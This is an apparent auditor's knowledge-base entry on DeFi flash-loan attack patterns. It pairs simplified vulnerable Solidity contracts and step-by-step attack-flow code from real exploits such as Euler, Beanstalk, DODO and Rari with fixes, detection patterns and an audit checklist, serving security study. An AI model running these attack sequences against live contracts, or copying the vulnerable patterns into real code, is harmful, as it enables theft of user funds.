---
# Core Classification
protocol: generic
chain: everychain
category: economic
vulnerability_type: flash_loan_attack

# Attack Vector Details
attack_type: economic_exploit|logical_error|state_manipulation
affected_component: flash_loan_mechanism|callback_validation|state_transition|collateral_calculation

# Technical Primitives
primitives:
  - flash_loan
  - flash_mint
  - callback_function
  - flash_loan_callback
  - initiator_validation
  - repayment_check
  - state_update_ordering
  - reentrancy_guard
  - collateral_valuation
  - donation_attack
  - self_liquidation
  - governance_voting
  - ERC3156
  - DODO_DVM
  - Balancer_flash
  - Aave_flash
  - Uniswap_flash

# Impact Classification
severity: critical
impact: fund_loss
exploitability: 0.85
financial_impact: critical

# Context Tags
tags:
  - defi
  - lending
  - dex
  - vault
  - governance
  - real_exploit
  - DeFiHackLabs

# Version Info
language: solidity
version: all

# Source
source: DeFiHackLabs

# Pattern Identity (Required)
root_cause_family: missing_validation
pattern_key: missing_validation | flash_loan_mechanism | flash_loan_attack

# Interaction Scope (Required for multi-contract or multi-path issues)
interaction_scope: multi_contract

# Grep / Hunt-Card Seeds (Required)
code_keywords:
  - Aave_flash
  - Balancer_flash
  - DODO_DVM
  - DVMFlashLoanCall
  - ERC3156
  - Reinitialization
  - Uniswap_flash
  - addLiquidity
  - approve
  - attack
  - balanceOf
  - block.number
  - block.timestamp
  - borrow
  - burn
  - callback_function
  - claimTokens
  - collateral_valuation
  - deposit
  - depositByAddLiquidity
---

# Flash Loan Attack Vulnerability Patterns

## Overview

Flash loan attacks exploit the atomic nature of blockchain transactions to borrow massive amounts of capital (often hundreds of millions in value) without collateral, manipulate protocol state, and extract value—all within a single transaction. This database entry documents **real-world flash loan attack patterns** extracted from 30+ DeFiHackLabs exploit PoCs spanning 2021-2025, focusing on the flash loan MECHANISM vulnerabilities rather than price manipulation.

**Total Historical Losses from Analyzed Exploits: >$500M USD**

---



#### Agent Quick View

- Root cause statement: "This vulnerability exists because of missing_validation"
- Pattern key: `missing_validation | flash_loan_mechanism | flash_loan_attack`
- Interaction scope: `multi_contract`
- Primary affected component(s): `flash_loan_mechanism|callback_validation|state_transition|collateral_calculation`
- High-signal code keywords: `Aave_flash`, `Balancer_flash`, `DODO_DVM`, `DVMFlashLoanCall`, `ERC3156`, `Reinitialization`, `Uniswap_flash`, `addLiquidity`
- Typical sink / impact: `fund_loss`
- Validation strength: `moderate`

#### Contract / Boundary Map

- Entry surface(s): See pattern-specific attack scenarios below
- Contract hop(s): `AttackerToken.function -> EvilToken.function -> SecureAirdrop.function`
- Trust boundary crossed: `callback / external call`
- Shared state or sync assumption: `state consistency across operations`

#### Valid Bug Signals

- Signal 1: Critical input parameter not validated against expected range or format
- Signal 2: Oracle data consumed without staleness check or sanity bounds
- Signal 3: User-supplied address or calldata forwarded without validation
- Signal 4: Missing check allows operation under invalid or stale state

#### False Positive Guards

- Not this bug when: Validation exists but is in an upstream function caller
- Safe if: Parameter range is inherently bounded by the type or protocol invariant
- Requires attacker control of: specific conditions per pattern

## Attack Categories

### 1. Flash Loan Callback Validation Issues
Missing or improper validation of flash loan callback initiator/origin.

### 2. Flash Loan + Reentrancy Combinations
Exploiting reentrancy through flash loan callbacks or state manipulation.

### 3. Flash Mint Attacks
Exploiting flash minting of protocol tokens to manipulate state.

### 4. Flash Loan + Self-Liquidation
Using flash loans to create and exploit self-liquidation conditions.

### 5. Unchecked Flash Loan Initiator
Flash loan callbacks that don't verify the legitimate initiator.

### 6. Flash Loan + Governance Manipulation
Using flash-loaned tokens to manipulate governance votes.

### 7. Uninitialized/Reinitializable Flash Loan Pools
Exploiting pools that can be reinitialized during flash loan callbacks.

---

## Vulnerable Pattern Examples

### Example 1: Flash Loan Callback Without Initiator Validation [CRITICAL]

**Real Exploit: EFLeverVault (2022-10) - ~750 ETH Lost**

The attacker exploited a vault that accepted flash loan callbacks from anyone, allowing them to manipulate the vault's internal accounting.

```solidity
// ❌ VULNERABLE: No validation of flash loan initiator
// From EFLeverVault exploit (2022-10)
contract VulnerableVault {
    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        // NO CHECK: Who initiated this flash loan?
        // Attacker can call vault.deposit(), then trigger flash loan
        // to themselves, causing vault to miscount balances
        
        // Process flash loan...
        _processLoan(tokens, amounts);
    }
}
```

**Attack Flow (from PoC):**
```solidity
// 1. Deposit small amount to vault
EFLEVER_VAULT.deposit{value: 1e17}(1e17);

// 2. Flash loan directly TO the vault (not through it)
// This manipulates the vault's internal balance tracking
BALANCER_VAULT.flashLoan(address(EFLEVER_VAULT), tokens, amounts, userData);

// 3. Withdraw more than deposited due to corrupted accounting
EFLEVER_VAULT.withdraw(9e16);
```

**Reference:** `DeFiHackLabs/src/test/2022-10/EFLeverVault_exp.sol`

---

### Example 2: Flash Loan + Reentrancy via Custom Token [CRITICAL]

**Real Exploit: Grim Finance (2021-12) - $30M Lost**

Flash loan combined with reentrancy through a malicious token's `transferFrom` callback.

```solidity
// ❌ VULNERABLE: depositFor allows arbitrary token that can callback
// From Grim Finance exploit
contract VulnerableVault {
    function depositFor(address token, uint256 amount, address user) external {
        // Calls token.transferFrom - if token is attacker-controlled,
        // it can re-enter depositFor multiple times
        IERC20(token).transferFrom(msg.sender, address(this), amount);
        
        // User shares minted based on amount parameter, not actual received
        _mint(user, amount);
    }
}

// Attacker's malicious token
contract AttackerToken {
    uint256 reentrancyCount = 7;
    
    function transferFrom(address, address, uint256) external returns (bool) {
        reentrancyCount--;
        if (reentrancyCount > 0) {
            // Re-enter with attacker token to inflate shares
            vault.depositFor(address(this), lpBalance, attacker);
        } else {
            // Final call uses real LP tokens
            vault.depositFor(realLPToken, lpBalance, attacker);
        }
        return true;
    }
}
```

**Attack Flow (from PoC):**
```solidity
// 1. Flash loan WFTM and BTC from BeethovenX
beethovenVault.flashLoan(IFlashLoanRecipient(address(this)), loanTokens, loanAmounts, "0x");

// 2. Add liquidity to SpiritSwap
router.addLiquidity(btcAddress, wftmAddress, btcLoanAmount, wftmLoanAmount, 0, 0, address(this), block.timestamp);

// 3. Call depositFor with attacker contract as token - triggers reentrancy
grimBoostVault.depositFor(address(this), lpBalance, address(this));

// 4. Attacker's transferFrom reenters 7 times, inflating shares
// 5. Withdraw inflated amount
grimBoostVault.withdrawAll();
```

**Reference:** `DeFiHackLabs/src/test/2021-12/Grim_exp.sol`

---

### Example 3: Flash Loan + Reentrancy via EvilToken [CRITICAL]

**Real Exploit: Paraluni (2022-03) - $1.7M Lost**

Flash loan combined with reentrancy through a malicious token during liquidity operations.

```solidity
// ❌ VULNERABLE: depositByAddLiquidity accepts arbitrary token pairs
contract VulnerableMasterChef {
    function depositByAddLiquidity(
        uint256 pid,
        address[2] memory tokens,
        uint256[2] memory amounts
    ) external {
        // Transfers tokens - if one is attacker-controlled, can re-enter
        IERC20(tokens[0]).transferFrom(msg.sender, address(this), amounts[0]);
        IERC20(tokens[1]).transferFrom(msg.sender, address(this), amounts[1]);
        
        // Add liquidity and credit user
        _addLiquidityAndDeposit(pid, tokens, amounts);
    }
}

// Attacker's EvilToken
contract EvilToken {
    function transferFrom(address, address, uint256) external returns (bool) {
        if (msg.sender != address(masterchef)) {
            // During callback, deposit REAL tokens (USDT/BUSD)
            usdt.approve(address(masterchef), type(uint256).max);
            busd.approve(address(masterchef), type(uint256).max);
            masterchef.depositByAddLiquidity(
                18, 
                [address(usdt), address(busd)], 
                [usdt.balanceOf(address(this)), busd.balanceOf(address(this))]
            );
        }
        return true;
    }
}
```

**Attack Flow (from PoC):**
```solidity
// 1. Flash loan USDT and BUSD via PancakeSwap
pair.swap(10_000 * 1e18, 10_000 * 1e18, address(this), new bytes(1));

// 2. In callback, transfer real tokens to EvilToken
usdt.transfer(address(token1), usdt.balanceOf(address(this)));
busd.transfer(address(token1), busd.balanceOf(address(this)));

// 3. Call depositByAddLiquidity with EvilToken - triggers nested deposit
masterchef.depositByAddLiquidity(18, [address(token0), address(token1)], [1, 1]);

// 4. EvilToken's transferFrom deposits real tokens during callback
// 5. Withdraw both deposits - profit from double-counting
```

**Reference:** `DeFiHackLabs/src/test/2022-03/Paraluni_exp.sol`

---

### Example 4: Flash Loan + Donation Attack for Self-Liquidation [CRITICAL]

**Real Exploit: Euler Finance (2023-03) - $200M Lost**

Flash loan used to create artificial bad debt through donation, then self-liquidate for profit.

```solidity
// ❌ VULNERABLE: donateToReserves can be called to destroy collateral
// Euler Finance vulnerability pattern
contract VulnerableLending {
    function donateToReserves(uint256 subAccountId, uint256 amount) external {
        // User can donate their eTokens (collateral) to reserves
        // This creates bad debt if they have outstanding borrows
        _burn(msg.sender, amount);
        reserves += amount;
        // NO CHECK: Does user still have sufficient collateral?
    }
    
    function liquidate(address violator, address underlying, address collateral, uint256 repay) external {
        // Liquidator takes discounted collateral
        // If violator donated away their collateral, liquidator profits
    }
}
```

**Attack Flow (from PoC):**
```solidity
// 1. Flash loan 30M DAI from Aave V2
AaveV2.flashLoan(address(this), assets, amounts, modes, address(this), params, 0);

// 2. Deploy violator and liquidator contracts
violator = new Iviolator();
liquidator = new Iliquidator();

// 3. Violator deposits 20M DAI, mints 200M eDAI (10x leverage)
eDAI.deposit(0, 20_000_000 * 1e18);
eDAI.mint(0, 200_000_000 * 1e18);

// 4. Repay some debt, then mint more (increase leverage)
dDAI.repay(0, 10_000_000 * 1e18);
eDAI.mint(0, 200_000_000 * 1e18);

// 5. KEY: Donate 100M eDAI to reserves - creates bad debt
eDAI.donateToReserves(0, 100_000_000 * 1e18);

// 6. Now eDAI < dDAI, violator is liquidatable
// Liquidator liquidates violator, takes remaining eDAI at discount
Euler.liquidate(violator, address(DAI), address(DAI), returnData.repay, returnData.yield);

// 7. Withdraw and repay flash loan with profit
eDAI.withdraw(0, DAI.balanceOf(Euler_Protocol));
```

**Reference:** `DeFiHackLabs/src/test/2023-03/Euler_exp.sol`

---

### Example 5: Flash Loan + Governance Manipulation [CRITICAL]

**Real Exploit: Beanstalk Farms (2022-04) - $182M Lost**

Flash loan used to acquire voting power and pass malicious governance proposal.

```solidity
// ❌ VULNERABLE: Governance allows same-block deposit/vote/execute
contract VulnerableGovernance {
    function deposit(uint256 amount) external {
        // Deposit tokens to gain voting power
        token.transferFrom(msg.sender, address(this), amount);
        votingPower[msg.sender] += amount;
        // NO TIMELOCK on voting power
    }
    
    function vote(uint256 proposalId) external {
        // Vote immediately with deposited tokens
        proposals[proposalId].votes += votingPower[msg.sender];
    }
    
    function emergencyCommit(uint256 proposalId) external {
        // If quorum reached, execute immediately
        require(proposals[proposalId].votes >= quorum, "Not enough votes");
        _execute(proposals[proposalId].payload);
    }
}
```

**Attack Flow (from PoC):**
```solidity
// 1. Pre-attack: Submit malicious proposal that drains treasury
beanstalkgov.propose(_diamondCut, address(this), sweepPayload, 3);

// 2. Wait for voting delay (24 hours)
vm.warp(block.timestamp + 24 * 60 * 60);

// 3. Flash loan 350M DAI, 500M USDC, 150M USDT from Aave
aavelendingPool.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);

// 4. In callback: Add liquidity to Curve, deposit to Silo for voting power
threeCrvPool.add_liquidity(tempAmounts, 0);
bean3Crv_f.add_liquidity(tempAmounts2, 0);
siloV2Facet.deposit(address(bean3Crv_f), balance);

// 5. Vote is already cast during propose, call emergencyCommit
beanstalkgov.emergencyCommit(bip);  // Executes sweep()

// 6. Malicious payload drains all funds to attacker
// 7. Remove liquidity and repay flash loan
```

**Reference:** `DeFiHackLabs/src/test/2022-04/Beanstalk_exp.sol`

---

### Example 6: Flash Loan + Pool Reinitialization [CRITICAL]

**Real Exploit: DODO (2021-03) - $3.8M Lost**

Flash loan callback allows reinitialization of the flash loan pool itself.

```solidity
// ❌ VULNERABLE: init() can be called during flash loan callback
contract VulnerableDVM {
    bool public initialized;
    
    function init(address maintainer, address token1, address token2, ...) external {
        // NO CHECK: Is this being called during a flash loan?
        // NO CHECK: Is this already initialized?
        _baseToken = token1;
        _quoteToken = token2;
        initialized = true;
    }
    
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address to, bytes calldata data) external {
        // Transfer tokens to borrower
        _baseToken.transfer(to, baseAmount);
        _quoteToken.transfer(to, quoteAmount);
        
        // Callback - attacker can call init() here!
        IDVMCallee(to).DVMFlashLoanCall(msg.sender, baseAmount, quoteAmount, data);
        
        // Repayment check uses potentially changed tokens
        require(_baseToken.balanceOf(address(this)) >= baseReserve, "...");
    }
}
```

**Attack Flow (from PoC):**
```solidity
// 1. Flash loan wCRES and USDT from DODO DVM pool
dvm.flashLoan(wCRES_amount, usdt_amount, address(this), "whatever");

// 2. In callback: Reinitialize the pool with different tokens!
function DVMFlashLoanCall(address, uint256, uint256, bytes memory) public {
    // Change the pool's base/quote tokens to worthless tokens
    dvm.init(maintainer, fakeToken1, fakeToken2, lpFeeRate, mtFeeRateModel, i, k, false);
    
    // Now repayment check uses fake tokens, not wCRES/USDT
    // Transfer borrowed tokens to attacker wallet
    wCRES_token.transfer(mywallet, wCRES_token.balanceOf(address(this)));
    usdt_token.transfer(mywallet, usdt_token.balanceOf(address(this)));
}
// Pool checks fake token balances - passes because attacker didn't borrow fake tokens
```

**Reference:** `DeFiHackLabs/src/test/2021-03/dodo_flashloan_exp.sol`

---

### Example 7: Flash Loan + Rari/Fei Reentrancy [CRITICAL]

**Real Exploit: Rari Capital/Fei Protocol (2022-04) - $80M Lost**

Flash loan combined with reentrancy via cToken reentrancy during exitMarket.

```solidity
// ❌ VULNERABLE: exitMarket can be called during ETH transfer callback
contract VulnerableComptroller {
    function borrow(uint256 amount) external {
        require(getAccountLiquidity(msg.sender) >= amount, "Undercollateralized");
        
        // Transfer ETH - triggers receive() in attacker contract
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        // Update borrow balance AFTER transfer
        borrowBalances[msg.sender] += amount;
    }
}

// Attacker exploits via receive() callback
contract Attacker {
    receive() external payable {
        // During ETH transfer, exit the market to release collateral
        comptroller.exitMarket(address(fusdc));
        // Now can redeem collateral even though we have outstanding borrow
    }
}
```

**Attack Flow (from PoC):**
```solidity
// 1. Flash loan 150M USDC from Balancer
vault.flashLoan(address(this), tokens, amounts, "");

// 2. In callback: Mint fUSDC with borrowed USDC
fusdc_127.mint(15_000_000_000_000);

// 3. Enter markets with fUSDC as collateral
rari_Comptroller.enterMarkets(ctokens);

// 4. Borrow ETH against fUSDC collateral
fETH_127.borrow(1977 ether);  // Triggers receive()

// 5. In receive(): Exit market to release collateral
receive() external payable {
    rari_Comptroller.exitMarket(address(fusdc_127));
}

// 6. Redeem fUSDC even though we have ETH debt
fusdc_127.redeemUnderlying(15_000_000_000_000);

// 7. Repay flash loan, keep ETH profit
```

**Reference:** `DeFiHackLabs/src/test/2022-04/Rari_exp.sol`

---

### Example 8: Flash Loan + XSURGE Reentrancy via sell() [CRITICAL]

**Real Exploit: XSURGE (2021-08) - $5M Lost**

Flash loan combined with reentrancy through token's sell function that sends ETH.

```solidity
// ❌ VULNERABLE: sell() sends ETH before updating state
contract VulnerableSurgeToken {
    function sell(uint256 amount) external {
        uint256 ethToSend = calculateSellReturn(amount);
        
        // Send ETH BEFORE burning tokens - enables reentrancy
        (bool success, ) = msg.sender.call{value: ethToSend}("");
        require(success, "Transfer failed");
        
        // Burn tokens AFTER - can be re-entered
        _burn(msg.sender, amount);
    }
}

// Attacker's receive function
contract Attacker {
    uint8 public time = 0;
    
    receive() external payable {
        if (msg.sender == address(surge) && time < 6) {
            // Buy more tokens during the sell callback
            surge.call{value: address(this).balance}("");
            time++;
        }
    }
}
```

**Attack Flow (from PoC):**
```solidity
// 1. Flash loan 10,000 WBNB via PancakeSwap
ipancake.swap(0, 10_000 * 1e18, address(this), "0x00");

// 2. Convert WBNB to BNB and buy Surge tokens
wbnb.withdraw(wbnb.balanceOf(address(this)));
payable(Surge_Address).call{value: address(this).balance}("");

// 3. Sell Surge tokens - triggers receive()
surge.sell(surge.balanceOf(address(this)));

// 4. In receive(): Buy more Surge with received ETH (7 times)
// Each buy/sell cycle extracts more value due to stale price

// 5. Final sell, convert profit to WBNB, repay flash loan
```

**Reference:** `DeFiHackLabs/src/test/2021-08/XSURGE_exp.sol`

---

### Example 9: Flash Loan + NFT Flash Loan Airdrop Gaming [HIGH]

**Real Exploit: ApeCoin/BAYC (2022-05) - $1.1M Lost**

Flash loan of NFTs to claim airdrops, then return NFTs.

```solidity
// ❌ VULNERABLE: Airdrop doesn't track if NFT was held long-term
contract VulnerableAirdrop {
    mapping(uint256 => bool) public claimed;
    
    function claimTokens() external {
        uint256[] memory nfts = bayc.tokensOfOwner(msg.sender);
        for (uint256 i = 0; i < nfts.length; i++) {
            if (!claimed[nfts[i]]) {
                claimed[nfts[i]] = true;
                ape.transfer(msg.sender, CLAIM_AMOUNT);
            }
        }
        // NO CHECK: Did user hold NFT before airdrop announcement?
    }
}
```

**Attack Flow (from PoC):**
```solidity
// 1. Flash loan 5.2 BAYC tokens from NFTX Vault (ERC3156 style)
NFTXVault.flashLoan(address(this), address(NFTXVault), 5_200_000_000_000_000_000, "");

// 2. In callback: Redeem fractional tokens for actual NFTs
NFTXVault.redeem(5, blank);

// 3. Claim APE airdrop for each NFT
AirdropGrapesToken.claimTokens();  // Claims 60,564 APE

// 4. Re-deposit NFTs back to vault
bayc.setApprovalForAll(address(NFTXVault), true);
NFTXVault.mint(nfts, blank);

// 5. Return flash loan, keep APE tokens
```

**Reference:** `DeFiHackLabs/src/test/2022-05/Bayc_apecoin_exp.sol`

---

### Example 10: Nested Flash Loans for Maximum Capital [HIGH]

**Real Exploit: OverNight (2022-12) - $170K Lost**

Chaining multiple flash loans from different protocols to maximize attack capital.

```solidity
// Pattern: Nested flash loans from multiple sources
contract Attacker {
    function attack() external {
        // First flash loan from Aave V2
        AaveV2.flashLoan(address(this), assets1, amounts1, modes, address(this), "", 0);
    }
    
    function executeOperation(/* Aave callback */) external returns (bool) {
        if (msg.sender == address(AaveV2)) {
            // Inside Aave callback, take another flash loan from Aave V3
            AaveV3.flashLoan(address(this), assets2, amounts2, modes, address(this), "", 0);
            return true;
        } else {
            // Inside nested callback, execute actual exploit
            _executeExploit();
            return true;
        }
    }
}
```

**Attack Flow (from PoC):**
```solidity
// 1. Flash loan USDC.e from Aave V2
LendingPoolV2.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);

// 2. In V2 callback: Flash loan USDC from Aave V3
PoolV3.flashLoan(address(this), assets1, amounts1, modes, address(this), "", 0);

// 3. In V3 callback: Execute manipulation
//    - Deposit to Benqi, borrow, swap through Curve
//    - Manipulate USD+ price via buy()
//    - Arbitrage the price difference

// 4. Unwind nested flash loans with profit
```

**Reference:** `DeFiHackLabs/src/test/2022-12/Overnight_exp.sol`

---

### Example 11: Flash Loan + Beefy Vault Harvest Timing [HIGH]

**Real Exploit: MooCAKECTX (2022-11) - $140K Lost**

Flash loan timed with vault harvest to extract pending rewards.

```solidity
// ❌ VULNERABLE: Anyone can trigger harvest
contract VulnerableStrategy {
    function harvest() external {
        // Claim rewards and compound
        uint256 rewards = pendingRewards();
        _claimRewards();
        _compound(rewards);
        // NO ACCESS CONTROL: Anyone can call
    }
}
```

**Attack Flow (from PoC):**
```solidity
// 1. Deposit small amount of CTK to SmartChef (required for attack)
CTK.transfer(address(SmartChef), CTK.balanceOf(address(this)));

// 2. Flash loan 400K BUSD from DODO
DVM(dodo).flashLoan(0, 400_000 * 1e18, address(this), new bytes(1));

// 3. In callback:
//    - Deposit BUSD to Venus (vBUSD)
//    - Borrow CAKE from Venus (vCAKE)
//    - Deposit CAKE to Beefy vault
//    - Trigger harvest() - attacker gets share of rewards
//    - Withdraw from Beefy
//    - Repay Venus borrow
//    - Withdraw from Venus

// 4. Repay flash loan with CAKE profit
```

**Reference:** `DeFiHackLabs/src/test/2022-11/MooCAKECTX_exp.sol`

---

### Example 12: Flash Loan + Empty Market Manipulation [CRITICAL]

**Real Exploit: PolterFinance (2024-11) - $7M Lost**

Flash loan to manipulate newly listed/empty market collateral valuations.

```solidity
// ❌ VULNERABLE: New market with no liquidity can be manipulated
contract VulnerableLending {
    function deposit(address asset, uint256 amount, address onBehalfOf, uint16 refCode) external {
        // Deposit asset as collateral
        IERC20(asset).transferFrom(msg.sender, address(this), amount);
        
        // Get price from oracle - if market is empty, can be manipulated
        uint256 price = oracle.getAssetPrice(asset);
        
        // Credit collateral value
        collateral[onBehalfOf] += amount * price;
    }
    
    function borrow(address asset, uint256 amount, ...) external {
        require(collateral[msg.sender] >= amount * collateralFactor, "Undercollateralized");
        // Borrow against inflated collateral
    }
}
```

**Attack Flow (from PoC):**
```solidity
// 1. Flash loan SpookyToken from Uniswap V3
WFTM_SpookyToken_V3Pool.flash(address(this), 0, spookyToken.balanceOf(pool), "");

// 2. In callback: Flash swap more SpookyToken from V2
JFTM_SpookyToken_V2Pool.swap(0, balance - 1e6, address(this), "0");

// 3. In V2 callback: Deposit tiny amount of SpookyToken as collateral
//    Empty market means oracle price is manipulatable
pitfall.deposit(address(spookyToken), 1e18, address(this), 0);

// 4. Borrow ALL tokens from ALL reserves
for each reserve:
    pitfall.borrow(asset, aToken.balanceOf(reserve), 2, 0, address(this));

// 5. Transfer stolen funds, repay flash swaps/loans
```

**Reference:** `DeFiHackLabs/src/test/2024-11/PolterFinance_exploit.sol`

---

## Impact Analysis

### Technical Impact
- **Complete fund drainage** from lending protocols
- **Governance takeover** via flash-loaned voting power
- **Collateral manipulation** leading to bad debt
- **Reserve depletion** through self-liquidation attacks
- **Reward theft** via timed harvest attacks
- **NFT airdrop gaming** using flash-loaned NFTs

### Financial Impact Summary

| Exploit | Date | Loss | Attack Vector |
|---------|------|------|---------------|
| Euler Finance | 2023-03 | $200M | Donation + Self-liquidation |
| Beanstalk | 2022-04 | $182M | Governance manipulation |
| Rari/Fei | 2022-04 | $80M | cToken reentrancy |
| Grim Finance | 2021-12 | $30M | Callback reentrancy |
| PolterFinance | 2024-11 | $7M | Empty market manipulation |
| XSURGE | 2021-08 | $5M | Sell reentrancy |
| DODO | 2021-03 | $3.8M | Pool reinitialization |
| Paraluni | 2022-03 | $1.7M | EvilToken reentrancy |
| ApeCoin | 2022-05 | $1.1M | NFT flash loan airdrop |
| EFLeverVault | 2022-10 | ~750 ETH | Callback validation |

---

## Secure Implementation Patterns

### Fix 1: Validate Flash Loan Initiator

```solidity
// ✅ SECURE: Track and validate flash loan initiator
contract SecureVault {
    address private _flashLoanInitiator;
    
    function initiateFlashLoan(uint256 amount) external {
        _flashLoanInitiator = msg.sender;
        flashLoanProvider.flashLoan(address(this), amount);
        _flashLoanInitiator = address(0);
    }
    
    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        // Only accept callbacks from our own initiated flash loans
        require(_flashLoanInitiator != address(0), "Unauthorized callback");
        require(msg.sender == address(flashLoanProvider), "Invalid sender");
        
        _processLoan(tokens, amounts);
    }
}
```

### Fix 2: Reentrancy Guards on Callbacks

```solidity
// ✅ SECURE: Reentrancy protection on all external interactions
contract SecureVault is ReentrancyGuard {
    function deposit(address token, uint256 amount) external nonReentrant {
        // Safe from callback reentrancy
        IERC20(token).safeTransferFrom(msg.sender, address(this), amount);
        _mint(msg.sender, amount);
    }
    
    function depositFor(address token, uint256 amount, address user) external nonReentrant {
        // Validate token is whitelisted
        require(whitelistedTokens[token], "Token not whitelisted");
        
        uint256 balanceBefore = IERC20(token).balanceOf(address(this));
        IERC20(token).safeTransferFrom(msg.sender, address(this), amount);
        uint256 actualReceived = IERC20(token).balanceOf(address(this)) - balanceBefore;
        
        // Mint based on ACTUAL received, not parameter
        _mint(user, actualReceived);
    }
}
```

### Fix 3: Governance Voting Timelock

```solidity
// ✅ SECURE: Timelock on voting power
contract SecureGovernance {
    mapping(address => uint256) public depositBlock;
    uint256 public constant VOTING_DELAY = 1000; // ~3 hours at 12s blocks
    
    function deposit(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        votingPower[msg.sender] += amount;
        depositBlock[msg.sender] = block.number;
    }
    
    function vote(uint256 proposalId) external {
        // Cannot vote with recently deposited tokens
        require(
            block.number >= depositBlock[msg.sender] + VOTING_DELAY,
            "Voting power not mature"
        );
        proposals[proposalId].votes += votingPower[msg.sender];
    }
}
```

### Fix 4: Prevent Reinitialization

```solidity
// ✅ SECURE: One-time initialization with lock
contract SecurePool {
    bool private _initialized;
    bool private _inFlashLoan;
    
    function init(address token1, address token2, ...) external {
        require(!_initialized, "Already initialized");
        require(!_inFlashLoan, "Cannot init during flash loan");
        
        _baseToken = token1;
        _quoteToken = token2;
        _initialized = true;
    }
    
    function flashLoan(uint256 amount, address to, bytes calldata data) external {
        _inFlashLoan = true;
        
        _baseToken.transfer(to, amount);
        IDVMCallee(to).DVMFlashLoanCall(msg.sender, amount, 0, data);
        
        require(_baseToken.balanceOf(address(this)) >= baseReserve, "Insufficient repayment");
        
        _inFlashLoan = false;
    }
}
```

### Fix 5: Snapshot-Based Airdrop Claims

```solidity
// ✅ SECURE: Airdrop based on historical snapshot
contract SecureAirdrop {
    uint256 public snapshotBlock;
    mapping(uint256 => address) public nftOwnerAtSnapshot;
    
    constructor(uint256 _snapshotBlock) {
        snapshotBlock = _snapshotBlock;
        // Record ownership at snapshot (done off-chain or via historical query)
    }
    
    function claimTokens(uint256[] calldata nftIds, bytes32[] calldata proofs) external {
        for (uint256 i = 0; i < nftIds.length; i++) {
            // Verify caller owned NFT at snapshot time
            require(
                verifyOwnership(nftIds[i], msg.sender, proofs[i]),
                "Not owner at snapshot"
            );
            require(!claimed[nftIds[i]], "Already claimed");
            
            claimed[nftIds[i]] = true;
            ape.transfer(msg.sender, CLAIM_AMOUNT);
        }
    }
}
```

---

## Detection Patterns

### Code Patterns to Look For

```
1. Flash loan callbacks without initiator validation:
   - receiveFlashLoan() with no msg.sender or initiator check
   - onFlashLoan() accepting any caller
   - DVMFlashLoanCall() without origin validation

2. External calls to arbitrary addresses during deposits:
   - IERC20(token).transferFrom() where token is user-supplied
   - depositFor(address token, ...) patterns
   - addLiquidity with arbitrary token pairs

3. State updates after external calls:
   - token.transfer() followed by balance updates
   - ETH transfer followed by state changes
   - External call followed by _mint()

4. Governance without voting power timelocks:
   - deposit() + vote() callable in same block
   - No delay between acquiring tokens and voting
   - emergencyCommit() without cooldown

5. Reinitializable contracts:
   - init() without initialized flag
   - Public initialization functions
   - Missing state lock during flash loans

6. Price-dependent operations without oracle manipulation protection:
   - Empty markets accepting deposits
   - Collateral valuation during same-block deposits
   - No TWAP or multi-oracle validation
```

### Audit Checklist

- [ ] Flash loan callbacks verify initiator address
- [ ] Flash loan callbacks verify caller is the flash loan provider
- [ ] Reentrancy guards on all state-changing functions
- [ ] Token whitelist for deposit/stake operations
- [ ] Actual received amount used (not parameter amount)
- [ ] Governance has voting power maturity delay
- [ ] Initialization can only happen once
- [ ] Initialization blocked during flash loan execution
- [ ] New markets have liquidity/time requirements before borrowing
- [ ] Airdrop claims based on historical snapshots
- [ ] Protocol cannot be drained in single transaction

---

## Real-World Examples Summary

### By Attack Vector

**Callback Validation Issues:**
- EFLeverVault (2022-10) - ~750 ETH
- AnnexFinance (2022-11) - Unreported

**Reentrancy via Callbacks:**
- Grim Finance (2021-12) - $30M
- Paraluni (2022-03) - $1.7M
- XSURGE (2021-08) - $5M
- Rari/Fei (2022-04) - $80M

**Governance Manipulation:**
- Beanstalk (2022-04) - $182M

**Donation/Self-Liquidation:**
- Euler Finance (2023-03) - $200M

**Pool Reinitialization:**
- DODO (2021-03) - $3.8M

**NFT Flash Loans:**
- ApeCoin/BAYC (2022-05) - $1.1M

**Empty Market Manipulation:**
- PolterFinance (2024-11) - $7M

---

## Keywords for Search

`flash loan attack`, `flash loan callback`, `flash loan reentrancy`, `flash mint`, `flash loan governance`, `flash loan liquidation`, `donation attack`, `self liquidation`, `flash loan arbitrage`, `unchecked initiator`, `callback validation`, `flash loan fee`, `ERC3156`, `Aave flash loan`, `Balancer flash loan`, `DODO flash loan`, `Uniswap flash swap`, `PancakeSwap flash`, `receiveFlashLoan`, `onFlashLoan`, `DVMFlashLoanCall`, `executeOperation`, `flash loan manipulation`, `flash loan exploit`, `nested flash loan`, `chained flash loan`, `governance takeover`, `voting power manipulation`, `airdrop gaming`, `NFT flash loan`

---

## Related Vulnerabilities

- [Reentrancy Patterns](../reentrancy/defi-reentrancy-patterns.md) - Flash loan callbacks enable reentrancy
- [Price Manipulation](../../oracle/price-manipulation/flash-loan-oracle-manipulation.md) - Flash loans fund price manipulation
- [Governance Vulnerabilities](../dao-governance-vulnerabilities/) - Flash loans enable governance attacks
- [Flash Loan Implementation Issues](../flash-loan/FLASH_LOAN_VULNERABILITIES.md) - Protocol-side flash loan bugs

---

## References

### Technical Documentation
- [ERC-3156: Flash Loans](https://eips.ethereum.org/EIPS/eip-3156)
- [Aave Flash Loan Documentation](https://docs.aave.com/developers/guides/flash-loans)
- [Balancer Flash Loan Guide](https://docs.balancer.fi/reference/contracts/flash-loans.html)
- [DODO Flash Loan Documentation](https://docs.dodoex.io/product/flash-loan)

### Security Research
- [DeFiHackLabs Repository](https://github.com/SunWeb3Sec/DeFiHackLabs)
- [Euler Finance Post-Mortem](https://www.euler.finance/blog/euler-post-mortem)
- [Beanstalk Post-Mortem](https://bean.money/blog/beanstalk-post-mortem)
- [Rari Capital Incident Analysis](https://twitter.com/RariCapital/status/1520460009069178880)

---

## DeFiHackLabs Real-World Exploits (37 incidents)

**Category**: Flash Loan | **Total Losses**: $513.7M | **Sub-variants**: 3

### Sub-variant Breakdown

#### Flash-Loan/Standalone (34 exploits, $513.6M)

